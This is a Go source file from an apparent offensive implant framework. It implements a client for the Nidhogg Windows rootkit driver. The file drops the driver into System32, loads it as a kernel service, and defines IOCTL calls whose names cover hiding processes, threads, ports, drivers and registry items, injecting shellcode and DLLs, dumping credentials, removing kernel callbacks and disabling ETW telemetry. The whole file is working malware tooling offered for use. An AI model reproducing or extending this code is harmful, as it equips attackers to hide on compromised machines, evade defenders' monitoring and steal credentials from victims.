package ttp

// nidhogg_client.go -- Nidhogg kernel driver client
//
// Architecture (mirrors Singularity K-series on Linux):
//   TTP 1000: deploy Nidhogg.sys driver (drop + SCM load)
//   TTPs 60-68: issue DeviceIoControl to \\.\Nidhogg
//
// Driver interaction:
//   - Open: CreateFile(\\.\Nidhogg, GENERIC_READ|GENERIC_WRITE, ...)
//   - Issue: DeviceIoControl(handle, IOCTL_*, inBuf, inSize, outBuf, outSize, ...)
//   - Close: CloseHandle
//
// Graceful fallback: if driver not loaded, all Nidhogg TTPs return ErrNidhoggNotAvailable.
// Userland TTPs (50/51) work independently.

import (
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"sync"
	"syscall"
	"unsafe"
)

// IOCTL codes (computed from CTL_CODE_COPY macro in IoctlShared.h):
// CTL_CODE_COPY(DeviceType, Function, Method, Access) =
//   (DeviceType << 16) | (Access << 14) | (Function << 2) | Method
// All use DeviceType=0x8000, Method=0 (BUFFERED), Access=0 (ANY)
const (
	ioctlProtectUnprotectProcess  = uint32(0x80002000) // 0x800 << 2
	ioctlClearProcesses           = uint32(0x80002004) // 0x801 << 2
	ioctlHideUnhideProcess        = uint32(0x80002008) // 0x802 << 2
	ioctlElevateProcess           = uint32(0x8000200C) // 0x803 << 2
	ioctlSetProcessSignatureLevel = uint32(0x80002010) // 0x804 << 2
	ioctlListProcesses            = uint32(0x80002014) // 0x805 << 2

	ioctlProtectUnprotectThread = uint32(0x80002018) // 0x806 << 2
	ioctlClearThreads           = uint32(0x8000201C) // 0x807 << 2
	ioctlHideUnhideThread       = uint32(0x80002020) // 0x808 << 2
	ioctlListThreads            = uint32(0x80002024) // 0x809 << 2

	ioctlProtectUnprotectFile = uint32(0x80002028) // 0x80A << 2
	ioctlClearProtectedFiles  = uint32(0x8000202C) // 0x80B << 2
	ioctlListFiles            = uint32(0x80002030) // 0x80C << 2

	ioctlProtectHideRegItem    = uint32(0x80002034) // 0x80D << 2
	ioctlUnprotectUnhideRegItem = uint32(0x80002038) // 0x80E << 2
	ioctlClearRegItems         = uint32(0x8000203C) // 0x80F << 2
	ioctlListRegItems          = uint32(0x80002040) // 0x810 << 2

	ioctlPatchModule        = uint32(0x80002044) // 0x811 << 2
	ioctlInjectShellcode    = uint32(0x80002048) // 0x812 << 2
	ioctlInjectDLL          = uint32(0x8000204C) // 0x813 << 2
	ioctlHideRestoreModule  = uint32(0x80002050) // 0x814 << 2
	ioctlHideUnhideDriver   = uint32(0x80002054) // 0x815 << 2
	ioctlDumpCredentials    = uint32(0x80002058) // 0x816 << 2

	ioctlListObCallbacks        = uint32(0x8000205C) // 0x817 << 2
	ioctlListPsRoutines         = uint32(0x80002060) // 0x818 << 2
	ioctlListRegCallbacks       = uint32(0x80002064) // 0x819 << 2
	ioctlRemoveRestoreCallback  = uint32(0x80002068) // 0x81A << 2
	ioctlEnableDisableEtwTI     = uint32(0x8000206C) // 0x81B << 2

	ioctlHideUnhidePort   = uint32(0x80002070) // 0x81C << 2
	ioctlClearHiddenPorts = uint32(0x80002074) // 0x81D << 2
	ioctlListHiddenPorts  = uint32(0x80002078) // 0x81E << 2

	ioctlExecNof = uint32(0x8000207C) // 0x81F << 2
)

// Nidhogg device name
const nidhoggDevice = `\\.\Nidhogg`

// PortType mirrors enum PortType in IoctlShared.h
const (
	portTypeTCP uint32 = 0
	portTypeUDP uint32 = 1
	portTypeAll uint32 = 2
)

// RegItemType mirrors enum RegItemType in IoctlShared.h
const (
	regItemProtectedKey   uint32 = 0
	regItemProtectedValue uint32 = 1
	regItemHiddenKey      uint32 = 2
	regItemHiddenValue    uint32 = 3
)

// InjectionType mirrors enum InjectionType in IoctlShared.h
const (
	injectionAPC    uint32 = 0
	injectionThread uint32 = 1
)

// ProcessType mirrors enum ProcessType in IoctlShared.h
const (
	processTypeProtected uint32 = 0
	processTypeHidden    uint32 = 1
	processTypeAll       uint32 = 2
)

// Driver name used by SCM
const (
	nidhoggServiceName = "nidhogg"
	nidhoggDropPath    = `C:\Windows\System32\drivers\nidhogg.sys`
)

var (
	// kernel32 and advapi32 are declared in masquerade.go and persist.go respectively.
	procCreateFileW        = kernel32.NewProc("CreateFileW")
	procDeviceIoControl    = kernel32.NewProc("DeviceIoControl")
	procCloseHandle        = kernel32.NewProc("CloseHandle")
	procOpenSCManager      = advapi32.NewProc("OpenSCManagerW")
	procCreateService      = advapi32.NewProc("CreateServiceW")
	procOpenService        = advapi32.NewProc("OpenServiceW")
	procStartService       = advapi32.NewProc("StartServiceW")
	procDeleteService      = advapi32.NewProc("DeleteService")
	procCloseServiceHandle = advapi32.NewProc("CloseServiceHandle")
	procControlService     = advapi32.NewProc("ControlService")
)

// ErrNidhoggNotAvailable is returned by all kernel TTPs when the driver is not loaded.
var ErrNidhoggNotAvailable = fmt.Errorf("nidhogg: driver not loaded (run TTP 1000 first)")

var (
	nidhoggHandle syscall.Handle = syscall.InvalidHandle
	nidhoggMu     sync.Mutex
)

// nidhoggOpen returns the device handle, opening it if not already open.
func nidhoggOpen() (syscall.Handle, error) {
	nidhoggMu.Lock()
	defer nidhoggMu.Unlock()

	if nidhoggHandle != syscall.InvalidHandle {
		return nidhoggHandle, nil
	}

	path, _ := syscall.UTF16PtrFromString(nidhoggDevice)
	h, _, err := procCreateFileW.Call(
		uintptr(unsafe.Pointer(path)),
		0xC0000000, // GENERIC_READ | GENERIC_WRITE
		0,
		0,
		3, // OPEN_EXISTING
		0, // FILE_ATTRIBUTE_NORMAL
		0,
	)
	if syscall.Handle(h) == syscall.InvalidHandle {
		return syscall.InvalidHandle, fmt.Errorf("nidhogg: open device: %w", err)
	}
	nidhoggHandle = syscall.Handle(h)
	return nidhoggHandle, nil
}

// NidhoggClose closes the device handle (call on agent shutdown).
func NidhoggClose() {
	nidhoggMu.Lock()
	defer nidhoggMu.Unlock()
	if nidhoggHandle != syscall.InvalidHandle {
		procCloseHandle.Call(uintptr(nidhoggHandle))
		nidhoggHandle = syscall.InvalidHandle
	}
}

// ioctl issues a DeviceIoControl call to the Nidhogg driver.
func ioctl(code uint32, inBuf []byte, outBuf []byte) (uint32, error) {
	h, err := nidhoggOpen()
	if err != nil {
		return 0, ErrNidhoggNotAvailable
	}

	var returned uint32
	var inPtr, outPtr uintptr
	var inSize, outSize uintptr

	if len(inBuf) > 0 {
		inPtr = uintptr(unsafe.Pointer(&inBuf[0]))
		inSize = uintptr(len(inBuf))
	}
	if len(outBuf) > 0 {
		outPtr = uintptr(unsafe.Pointer(&outBuf[0]))
		outSize = uintptr(len(outBuf))
	}

	r1, _, e := procDeviceIoControl.Call(
		uintptr(h),
		uintptr(code),
		inPtr, inSize,
		outPtr, outSize,
		uintptr(unsafe.Pointer(&returned)),
		0,
	)
	if r1 == 0 {
		if e.(syscall.Errno) != 0 {
			return 0, fmt.Errorf("DeviceIoControl 0x%08X: %w", code, e)
		}
		return 0, fmt.Errorf("DeviceIoControl 0x%08X failed", code)
	}
	return returned, nil
}

// ioctlPinnedPtr encodes the address of ptrData[0] into buf[ptrOffset:ptrOffset+8],
// issues DeviceIoControl, then calls runtime.KeepAlive to guarantee ptrData is not
// collected before the syscall completes. Required for Nidhogg structs that embed
// a WCHAR*/PVOID pointer (IoctlFileItem, IoctlHiddenDriverInfo, IoctlHiddenModuleInfo).
func ioctlPinnedPtr(code uint32, buf []byte, ptrOffset int, ptrData []byte) (uint32, error) {
	ptr := uintptr(unsafe.Pointer(&ptrData[0]))
	for i := 0; i < 8; i++ {
		buf[ptrOffset+i] = byte(ptr >> (uint(i) * 8))
	}
	n, err := ioctl(code, buf, nil)
	runtime.KeepAlive(ptrData)
	return n, err
}

// NidhoggAvailable returns true if the driver device is accessible.
func NidhoggAvailable() bool {
	_, err := nidhoggOpen()
	return err == nil
}

// NidhoggLocalStealthStatus returns a stealth status string for the beacon.
func NidhoggLocalStealthStatus() string {
	if NidhoggAvailable() {
		return "[nidhogg:active]"
	}
	return "[stealth_skip: windows]"
}

// NidhoggDeploy deploys the Nidhogg driver.
// sysPath: path to Nidhogg.sys; if empty, uses nidhoggDropPath.
// sysBuf: optional raw driver bytes to drop; if nil, sysPath must already exist.
func NidhoggDeploy(sysPath string, sysBuf []byte) (string, error) {
	if sysPath == "" {
		sysPath = nidhoggDropPath
	}

	// Drop driver binary if provided
	if len(sysBuf) > 0 {
		if err := os.WriteFile(sysPath, sysBuf, 0644); err != nil {
			return "", fmt.Errorf("nidhogg: drop driver: %w", err)
		}
	} else {
		if _, err := os.Stat(sysPath); err != nil {
			return "", fmt.Errorf("nidhogg: driver not found at %s and no bytes provided", sysPath)
		}
	}

	// Open SCM
	scm, _, err := procOpenSCManager.Call(0, 0, 0xF003F) // SC_MANAGER_ALL_ACCESS
	if scm == 0 {
		return "", fmt.Errorf("nidhogg: OpenSCManager: %w", err)
	}
	defer procCloseServiceHandle.Call(scm)

	// Create or open service
	name, _ := syscall.UTF16PtrFromString(nidhoggServiceName)
	display, _ := syscall.UTF16PtrFromString("Nidhogg")
	path, _ := syscall.UTF16PtrFromString(sysPath)

	svc, _, _ := procCreateService.Call(
		scm,
		uintptr(unsafe.Pointer(name)),
		uintptr(unsafe.Pointer(display)),
		0xF01FF, // SERVICE_ALL_ACCESS
		1,       // SERVICE_KERNEL_DRIVER
		3,       // SERVICE_DEMAND_START
		1,       // SERVICE_ERROR_NORMAL
		uintptr(unsafe.Pointer(path)),
		0, 0, 0, 0, 0,
	)
	if svc == 0 {
		// Already exists -- open it
		svc, _, err = procOpenService.Call(scm, uintptr(unsafe.Pointer(name)), 0xF01FF)
		if svc == 0 {
			return "", fmt.Errorf("nidhogg: OpenService: %w", err)
		}
	}
	defer procCloseServiceHandle.Call(svc)

	// Start service
	r, _, startErr := procStartService.Call(svc, 0, 0)
	if r == 0 {
		// ERROR_SERVICE_ALREADY_RUNNING = 1056
		if errno, ok := startErr.(syscall.Errno); ok && errno == 1056 {
			// already running -- just open device
		} else {
			return "", fmt.Errorf("nidhogg: StartService: %w", startErr)
		}
	}

	// Open device to confirm
	if _, err := nidhoggOpen(); err != nil {
		return "", fmt.Errorf("nidhogg: driver started but device open failed: %w", err)
	}

	return fmt.Sprintf("[nidhogg] driver loaded: %s", sysPath), nil
}

// NidhoggUnload stops and deletes the Nidhogg service.
func NidhoggUnload() (string, error) {
	NidhoggClose()

	scm, _, err := procOpenSCManager.Call(0, 0, 0xF003F)
	if scm == 0 {
		return "", fmt.Errorf("nidhogg: OpenSCManager: %w", err)
	}
	defer procCloseServiceHandle.Call(scm)

	name, _ := syscall.UTF16PtrFromString(nidhoggServiceName)
	svc, _, err := procOpenService.Call(scm, uintptr(unsafe.Pointer(name)), 0xF01FF)
	if svc == 0 {
		return "", fmt.Errorf("nidhogg: OpenService: %w", err)
	}
	defer procCloseServiceHandle.Call(svc)

	// Stop service
	var status [28]byte // SERVICE_STATUS = 7 DWORDs = 28 bytes
	procControlService.Call(svc, 1, uintptr(unsafe.Pointer(&status[0]))) // SERVICE_CONTROL_STOP=1

	// Delete service
	procDeleteService.Call(svc)

	return "[nidhogg] driver unloaded", nil
}

// utf16Buf encodes a string as a NUL-terminated UTF-16LE byte slice (max maxChars WCHARs).
func utf16Buf(s string, maxChars int) []byte {
	r := []rune(s)
	if len(r) > maxChars-1 {
		r = r[:maxChars-1]
	}
	buf := make([]byte, (len(r)+1)*2)
	for i, c := range r {
		binary.LittleEndian.PutUint16(buf[i*2:], uint16(c))
	}
	return buf
}
